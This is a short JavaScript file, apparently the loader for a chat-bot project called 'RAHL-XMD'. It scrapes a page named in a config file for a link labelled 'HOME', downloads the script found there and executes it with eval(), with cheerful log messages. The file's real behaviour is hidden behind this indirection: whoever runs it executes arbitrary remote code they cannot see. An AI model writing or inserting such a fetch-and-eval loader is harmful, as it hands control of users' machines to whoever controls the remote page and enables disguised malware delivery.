//  [RAHL-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Lord Rahl                                    
//  >> Version: 1.0.0quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require("./config"); // or rename to rahl if you want

async function fetchHOMEUrl() {
  try {
    // ✅ Fixed line below
    const response = await axios.get(adams.RAHL_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("HOME")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('heart not found 😭');
    }

    console.log('The heart is loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchHOMEUrl();
